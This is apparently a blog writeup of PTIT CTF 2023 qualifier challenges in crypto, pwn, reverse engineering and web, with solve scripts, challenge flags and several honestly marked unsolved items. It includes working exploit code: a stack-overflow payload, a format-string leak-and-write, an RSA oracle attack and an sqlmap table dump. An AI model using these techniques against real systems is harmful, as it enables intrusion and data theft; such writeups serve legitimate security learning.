---
title: "PTIT CTF 2023: writeups"
image:
  path: /assets/img/covers/ctf-ptit-ctf-2023-quals.webp
  alt: "PTIT CTF 2023 writeups"
date: 2023-08-27 14:00:00 +0700
categories: ["CTF Writeups", "PTIT CTF 2023"]
tags: [ctf, writeup, rev, pwn, crypto, web]
render_with_liquid: false
---

These are my writeups for the qualifying round of PTIT CTF 2023, a Vietnamese university CTF hosted by PTIT. I looked at the Crypto, Pwn, Reverse Engineering and Web challenges from the event. Several of the remote servers used for Pwn and Crypto are long gone, so for those I kept the exploit scripts and explain what they do, even where I could not re-confirm the final flag against a dead host. The challenge files themselves are not in this repo.

## Crypto - cr1

**Files:** [cr1.zip](/assets/ctf-files/ptit-ctf-2023-quals/cr1.zip)

An easy challenge. The binary `chall.c` reads a password from stdin and checks it against a few conditions.

```c
int checkPassword(char *a)
{
    int b = strlen(a);
    if ((b ^ 21))
        return 0;
    if ((strncmp(a, "\x50\x54\x49\x54\x43T\x46{", 8) ^ 0))
        return 0;
    if (a[20] != '}')
        return 0;
    char c[128];
    strcpy(c, a + 8);
    int i = 0;
    for (i = 0; i < 12; i++) {
        c[i] = c[i] ^ 72;
    }
    if ((strncmp(c, "\x10\x27\x3a\x17\x2d\x10\x2b\x21\x3c\x79\x26\x2f", 12) ^ 1))
        return 1;
    else
        return 0;
}
```

The password must be 21 bytes long, start with `PTITCTF{` and end with `}`. The 12 bytes in the middle are compared against a stored array after being XORed with `72`. So the flag is the stored array XORed with `72`, wrapped in the fixed prefix and suffix.

```cpp
#include <bits/stdc++.h>
using namespace std;

int main(){
    char a[9];
    strncpy(a, "\x50\x54\x49\x54\x43T\x46{", 8);
    a[8] = '\0';

    char s[13] = "\x10\x27\x3a\x17\x2d\x10\x2b\x21\x3c\x79\x26\x2f";

    for (int i = 0; i < 12; i++)
        s[i] = s[i] ^ 72;
    s[12] = '}';
    cout << a << s;
    return 0;
}
```

Flag: `PTITCTF{Xor_eXcit1ng}`

## Crypto - cr2

**Files:** [cr2.zip](/assets/ctf-files/ptit-ctf-2023-quals/cr2.zip)

A substitution cipher dressed up as emoji. `gen.py` takes the hex representation of a plaintext and replaces each hex nibble (`0` to `f`) with one of 16 shuffled emoji, so the mapping changes every run.

```python
import random

emojis = ["😭", "😰", "😱", "😡", "😝", "😘", "😍", "😉", "😃", "😂", "😋", "😤", "😣", "😵", "😔", "😅"]
m = open("text.txt", "rb").read().hex()

random.shuffle(emojis)

for e, c in zip(emojis, "0123456789abcdef"):
    m = m.replace(c, e)

open("out2.txt", "w", encoding="utf-8").write(m)
```

The intended attack is a frequency analysis, since the 16 hex nibbles do not appear with equal probability in typical English text or in the given `sample.txt`. `solve.py` counts how often each emoji shows up in the ciphertext and how often each hex digit shows up in the sample, then maps the most frequent emoji to the most frequent nibble, and so on down the list.

```python
text = open("out.txt").read()
sample = open("sample.txt").read()

sample = sample.encode().hex()

emojis = [n for n in list(set(text))]
emojis.sort(reverse=True, key=lambda x:text.count(x))

nibbles = [n for n in "0123456789abcdef"]
nibbles.sort(reverse=True, key=lambda x:sample.count(x))

for n in nibbles:
  print(n, sample.count(n))

for e, c in zip(emojis, nibbles):
  text = text.replace(e, c)

print(text)
```

Going through the leftover working files in the folder, `out3.txt` holds a partial manual decode, with the start of the ciphertext already turned into `P T I T C T F {`, confirming 8 of the 16 emoji-to-nibble mappings (`😣`=5, `😡`=0, `😃`=4, `😝`=9, `😉`=3, `😂`=6, `😍`=7, `😔`=b). I rebuilt that partial mapping and tried every remaining permutation of the other 8 emoji against the other 8 leftover nibbles, filtering for output that starts with `PTITCTF{` and ends in a printable ASCII run before a closing brace. None of the permutations produced a clean, sensible flag body, only garbled punctuation runs, so the full flag cannot be reconstructed from the files available.

Status: unsolved. The frequency method recovers the `PTITCTF{` prefix with confidence, but the remaining 8 emoji-to-nibble mappings could not be pinned down from the sample files without a clean match for the full ciphertext, so I am not reporting a guessed flag.

## Crypto - cr3

A remote RSA service where the message is encoded in base 5 instead of base 2, and the server leaks the LSB of a chosen ciphertext's decryption, which is a classic LSB oracle setup.

```python
from pwn import *
from Crypto.Util.number import *

def lsbOracle(c):
    r.recvuntil(b"c = ")
    r.sendline(str(c).encode())
    r.recvuntil(b"Result: ")
    m = r.recvline().strip()
    return int(m)

for j in tqdm(range(5)):
    check = 0
    r = remote("128.199.247.205", 6989)
    r.recvuntil(b"flag_enc = ")
    flag_enc = int(r.recvline().strip())
    r.recvuntil(b"e = ")
    e = int(r.recvline().strip())
    r.recvuntil(b"n = ")
    n = int(r.recvline().strip())
    r.recvuntil(b"Length: ")
    length = int(r.recvline().strip())
    flag = str(j)
    for i in tqdm(range(1, length + 10, 1)):
        inv = inverse(5*i, n)
        chosen_ct = (flag_enc // pow(inv, e, n) % n)
        output = lsbOracle(chosen_ct)
        flag_char = (output - (int(flag, 5) * inv) % n) % 5
        flag = str(flag_char) + flag
        try:
            if (b"PTITCTF{" in long_to_bytes(int(flag, 5))):
                print(long_to_bytes(int(flag, 5)))
                check = 1
                break
        except:
            pass
    if (check == 1):
        r.close()
        break
```

The idea: because the plaintext is represented in base 5 before encryption, multiplying the ciphertext by `(5*i)^e mod n` is equivalent to multiplying the underlying plaintext digit string by `5*i`, which shifts a known digit into a position the oracle can read back one base-5 digit at a time (instead of one bit at a time, as in a textbook LSB oracle). Each query recovers one more base-5 digit of the flag, built up from the last digit toward the first, and the loop checks after every digit whether `PTITCTF{` has appeared in the decoded bytes. Since this runs across 5 parallel guesses (`j` in `range(5)`) for the very first, as yet unknown digit, and stops as soon as one of them resolves to a string containing the flag marker.

Status: unsolved. The target, `128.199.247.205:6989`, is no longer reachable, so the oracle cannot be queried and no flag could be recorded for this writeup.

## Pwn - pwn1

**Files:** [pwn1.zip](/assets/ctf-files/ptit-ctf-2023-quals/pwn1.zip)

A stack buffer overflow challenge. The vulnerable function reads input with `gets()` into a 0x60-byte stack buffer, and a 4-byte integer check variable sits immediately after it on the stack.

```c
// Vuln(), from objdump -d
char buf[0x60];
int  magic;           // right after buf on the stack
gets(buf);
if (magic == 0x4DF218EE) {
    puts("...");
    Get_flag();
}
```

Since `buf` is 0x60 (96) bytes and `magic` is the 4 bytes right after it, 92 bytes of padding reach exactly up to `magic`, and the next 4 bytes overwrite it directly. There is no return-address overwrite involved, `gets()` simply lets the input run past the buffer into the adjacent stack variable.

```python
from pwn import *

p = remote("128.199.247.205", 1331)
padding = b"a" * 92
win = p64(0x4DF218EE)
payload = padding + win
p.sendline(payload)
p.interactive()
```

`p64()` packs the magic value as 8 little-endian bytes, of which the first 4 land exactly on `magic` and the rest overflow harmlessly further up the stack. Once `magic` reads back as `0x4DF218EE`, the binary calls `Get_flag()`, which opens `flag.txt` and prints it.

Status: unsolved as far as the final flag goes. The exploit logic is confirmed by reading the binary, but the remote host is down and the local `flag.txt` in this folder only contains a placeholder string, not a real flag, so I am not reporting one.

## Pwn - pwn2

**Files:** [pwn2.zip](/assets/ctf-files/ptit-ctf-2023-quals/pwn2.zip)

A format string challenge. The binary reads a string with `read()` and passes it straight to `printf()`, twice, which is a textbook format string bug, then checks a global `secret_number` against `0xab` (171) to decide whether to call `Get_flag()`.

```python
from pwn import *

p = remote("128.199.247.205", 1332)
mainoff = 0x133f
leak = b"%23$p"
p.sendlineafter(b"Give me secret number: ", leak)
mainaddr = p.recvline()
mainaddr = int(mainaddr, 16)

leak = mainaddr - mainoff
win = leak + 0x401C
print(hex(win))
x = b"%171c%8$hhnaaaaa" + p64(win)
print(x)

p.sendlineafter(b"(yes/no)", x)
p.interactive()
```

The first format string, `%23$p`, leaks the stack slot that happens to hold a return address inside `main`, because the binary is PIE. Subtracting the known offset of `main` (`0x133f`) from that leak gives the binary's load base, and adding the fixed offset of `secret_number` (`0x401c`) gives its absolute runtime address. The second payload writes to that address with the classic `%<N>c%<idx>$hhn` trick, printing 171 filler characters and then writing the resulting byte count, `0xab`, into the single byte pointed to by the eighth format argument, which is the address of `secret_number` appended at the end of the payload. Once `secret_number == 0xab`, the binary's own check passes and it calls `Get_flag()`.

Status: unsolved as far as the final flag goes, for the same reason as pwn1. The exploit logic is confirmed statically, but the remote host is down and the local `flag.txt` is a placeholder, not a real flag.

## Pwn - pwn3

**Files:** [pwn3.zip](/assets/ctf-files/ptit-ctf-2023-quals/pwn3.zip)

No solve script was kept for this challenge, so I reconstructed the mechanism from static analysis of the ELF (`objdump`, `strings`).

The binary mallocs a buffer, reads a line with `fgets()`, and rejects it outright if it contains the string `no hacking pls!!!1111!` (an anti-cheese check). Then it searches the input for a fixed secret phrase with `strstr()`.

```
giveMeTheFlagPLS
```

If that phrase is present, it opens `flag.txt`, reads a line from it, and prints it with `printf("here's your flag... %s", ...)`. There is no network code in the binary at all (no socket or connect calls appear in the disassembly), so the only input path is local stdin, and the only unknown is the content of the real `flag.txt` on the host that served this challenge.

Status: unsolved. The challenge mechanism (send a line containing `giveMeTheFlagPLS`) is fully recovered from static analysis, but the `flag.txt` shipped with these files is a local placeholder, not the real flag, so there is nothing further to recover without the original server.

## Rev - re1

**Files:** [re1.zip](/assets/ctf-files/ptit-ctf-2023-quals/re1.zip)

A time-seeded substitution cipher. The binary builds a shuffled 26-letter alphabet from `rand()`, seeded from the system clock, then uses that alphabet as a substitution key to decrypt a fixed, embedded ciphertext. It loops over candidate seeds near the current time until the decrypted text starts with `PTITCTF{`.

```cpp
void ran(char *a1, unsigned int a2) {
    char alphabet[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    srand(a2);
    strcpy(a1, alphabet);
    for (int i = 25; i > 0; i--) {
        int j = rand() % (i + 1);
        sw(&a1[i], &a1[j]);
    }
}

char flag[37] = "FVHVEVB{9dqIv5vdv54y_e5Fa7x_i4_r8wC}";
int main() {
    char v0[27] = "";
    int i = 0;
    while (true) {
        srand(time(0) + i);
        unsigned int v5 = rand();
        ran(v0, v5 << 5);
        decrypt(flag, v2, v0);
        if (strncmp(v2, "PTITCTF{", 8) == 0) {
            cout << v2 << endl;
            break;
        }
        i++;
    }
    return 0;
}
```

The actual attack the author's own `solve.cpp` runs is to replay the exact same seeding and shuffling logic locally and brute-force the `time(0)` value that produces the known substitution alphabet, since the binary was almost certainly run at (or very near) the moment the challenge was solved live. I reimplemented the same seed, shuffle and decrypt logic separately and swept a wide range of Unix timestamps covering the likely competition window, checking whether the first 5 ciphertext letters (`F`, `V`, `H`, `V`, `E`... matching `P`, `T`, `I`, `T`, `C`) land on the right positions in the shuffled alphabet. This did not land on a matching timestamp within a reasonable amount of brute-force time.

Status: unsolved. The decryption method (time-seeded Fisher-Yates shuffle used as a substitution alphabet, brute-forced against `time(0)`) is fully understood and reproduced, but recovering the exact seed used in the original run needs either the original machine's clock at solve time or a much longer brute-force window than was practical here, so I am not reporting a guessed flag.

## Rev - re2

**Files:** [re2.zip](/assets/ctf-files/ptit-ctf-2023-quals/re2.zip)

A packed, obfuscated Windows binary (`re2.rar` containing `re2.exe`, a 32-bit MinGW-compiled PE). The included `s.py` is an unfinished attempt at tracing the password check logic rather than a working solver, and the binary itself has anti-debug code (`IsDebuggerPresent`-style calls such as `BlockInput` turned up in the strings).

Static analysis of the binary's `.data` section shows a seed array that, once the transformation loop in `s.py` is applied with its `x`/`y` index and operation tables (add, subtract, XOR), decodes to a long run of recognizable flag text:

```python
aP = [80, -82, -18, 84, 67, 83, 121, 95, 98, 98, 121, 91, 53, 98, 102, 84, -41, -48, 52, 82,
      -14, 46, 52, 18, -58, 30, 68, 99, 66, 62, -61, 95, -27, 1, 112, 106, 121, 125, 0, 0]
aP.extend(aP[:37])

x = [54, 71, 49, 69, 67, 80, 75, 78, 62, 67, 78, 49, 56, 71, 59, 69, 68, 56, 82, 81, 68, 58, 61,
     55, 58, 64, 59, 55, 77, 84, 69, 68, 81, 65, 75, 50, 83, 71, 77, 53, 58, 73, 72, 78, 81, 62,
     65, 69, 77, 50]
y = [50, 50, 50, 51, 51, 51, 48, 49, 50, 51, 50, 49, 50, 48, 49, 48, 49, 48, 49, 49, 51, 50, 48,
     51, 49, 51, 48, 51, 51, 48, 49, 49, 48, 48, 48, 51, 49, 51, 51, 48, 49, 49, 51, 51, 48, 48,
     51, 50, 49, 50]

for j in range(50):
    v6 = x[j] - 48
    if y[j] == 51:
        aP[v6 + 40] += 142
    elif y[j] == 50:
        aP[v6 + 40] -= 51
    elif y[j] == 49:
        aP[v6 + 40] ^= 0x2F
    elif y[j] == 48:
        aP[v6 + 40] += 1

for i in range(len(aP)):
    if aP[i] > 256:
        aP[i] -= 256
    if aP[i] < 0:
        aP[i] += 256
```

Running this transformation, bytes 40 onward of `aP` decode to:

```
PTITCTF{0bFu5c4Te_4nD_4nT1DeBuG_s0_Ez
```

That is 37 characters with no closing brace, since `s.py`'s own index arithmetic only covers the first 37 of the 40-byte repeated block and its wrap-around handling (`aP[i] > 256`, which should be `255`, and an incomplete branch for one of the `y` values) looks unfinished.

Status: unsolved, but close. I recovered a long, readable candidate body, `PTITCTF{0bFu5c4Te_4nD_4nT1DeBuG_s0_Ez`, from static analysis of the embedded data and the transformation script, but without the closing brace and without a way to validate the last byte against the real binary (which was not run, per the static-analysis-only constraint), I am not completing or guessing the final character.

## Rev - re3

**Files:** [re3.zip](/assets/ctf-files/ptit-ctf-2023-quals/re3.zip)

A 32-bit Windows PE (`re3.exe`), small and not packed. Dumping its `.data` section directly shows the flag stored as a plain string, used by a `reverse`/`Success!` message pair guarded by a simple length and content check.

```
404020: 50544954 4354467b 77334c4c 63306d65  PTITCTF{w3LLc0me
404030: 5f74305f 72337665 5273655f 654e6731  _t0_r3veRse_eNg1
404040: 6e656552 316e4721 7d000000           neeR1nG!}
```

No execution or dynamic analysis was needed, the flag is simply present in the binary's data section in cleartext, and the surrounding checks only decide whether to print it, not how to compute it.

Flag: `PTITCTF{w3LLc0me_t0_r3veRse_eNg1neeR1nG!}`

## Rev - re4

**Files:** [re4.zip](/assets/ctf-files/ptit-ctf-2023-quals/re4.zip)

An XOR challenge against a fixed prefix. `solve.py` takes an array of encoded bytes and recovers the XOR key by XORing the first 7 bytes against the known prefix `PTITCTF`, since XOR with the correct key at those positions must produce exactly that prefix.

```python
v6 = bytearray(b"\x00" * 48)
source = b"\x19\a\x19\x17\x0F\x01\x042+`1\x13d1\x16&#p(\n 0\f\x18\" &6&=\x0F\"\"1\x1D? $;/>04"
for i in range(len(source)):
    v6[i] = source[i]

s = "PTITCTF"
key = bytearray()
for i in range(7):
    xored_value = v6[i] ^ ord(s[i])
    key.append(xored_value % 256)

print(key.decode())
```

The recovered 7-byte key then decodes the entire stored byte string with the same XOR, repeating the key cyclically.

```python
keystr = key.decode()
full = bytes(source[i] ^ ord(keystr[i % 7]) for i in range(len(source)))
print(full)
```

Flag: `PTITCTF{x0r_1s_us3d_by_Halston_and_vstxckr}`

## Web - web02

**Files:** [web02.zip](/assets/ctf-files/ptit-ctf-2023-quals/web02.zip)

An SQL injection challenge on the `search` parameter of a login-style form. The captured request shows a plain `POST` to `index.php` with a `search` field.

```
POST /index.php HTTP/1.1
Host: 14.225.255.180:5000
Content-Type: application/x-www-form-urlencoded
...
search=_&save=
```

The injection was automated with sqlmap at a high test level, dumping the `user` table from the `ISP` database directly.

```
sqlmap -r sql.txt -p search --threads 10 --level 5 -dump -D ISP -T user
```

The dump returns eleven rows, where the eleventh is a planted entry whose `name` column is `FLAG` and whose `email` column holds the flag itself.

```
Database: ISP
Table: user
[11 entries]
+----+-----------------+---------------------------+--------+
| id | name            | email                     | hidden |
+----+-----------------+---------------------------+--------+
...
| 11 | FLAG            | PTITCTF{sqlmap_iz_c00l}   | 1      |
+----+-----------------+---------------------------+--------+
```

Flag: `PTITCTF{sqlmap_iz_c00l}`
